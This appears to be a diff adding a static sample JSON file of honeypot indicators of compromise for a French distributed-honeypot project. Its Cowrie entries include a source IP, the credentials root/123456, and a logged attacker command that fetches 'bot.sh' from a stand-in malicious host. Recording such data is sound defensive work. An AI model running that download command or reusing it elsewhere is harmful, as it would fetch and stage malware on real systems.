@@ -1,0 +1,50 @@
+{
+  "meta": {
+    "project": "Honeypot Distribué Intelligent",
+    "version": "1.0",
+    "note": "Exemple statique pour démonstration — remplacé en live par le collecteur"
+  },
+  "stats": {
+    "total_iocs": 5,
+    "unique_attacker_ips": 2,
+    "by_type": { "ipv4": 2, "username": 1, "password": 1, "command": 1 },
+    "by_source": { "cowrie": 5 }
+  },
+  "iocs": [
+    {
+      "type": "ipv4",
+      "value": "203.0.113.50",
+      "source": "cowrie",
+      "first_seen": "2026-06-01T10:00:00+00:00",
+      "context": { "eventid": "cowrie.login.failed", "honeypot": "cowrie" }
+    },
+    {
+      "type": "username",
+      "value": "root",
+      "source": "cowrie",
+      "first_seen": "2026-06-01T10:00:01+00:00",
+      "context": { "credential_type": "username" }
+    },
+    {
+      "type": "password",
+      "value": "123456",
+      "source": "cowrie",
+      "first_seen": "2026-06-01T10:00:01+00:00",
+      "context": { "credential_type": "password" }
+    },
+    {
+      "type": "command",
+      "value": "wget http://malicious.example/bot.sh",
+      "source": "cowrie",
+      "first_seen": "2026-06-01T10:00:05+00:00",
+      "context": { "eventid": "cowrie.command.input" }
+    },
+    {
+      "type": "url",
+      "value": "http://malicious.example/bot.sh",
+      "source": "cowrie",
+      "first_seen": "2026-06-01T10:00:05+00:00",
+      "context": { "extracted_from": "command" }
+    }
+  ]
+}
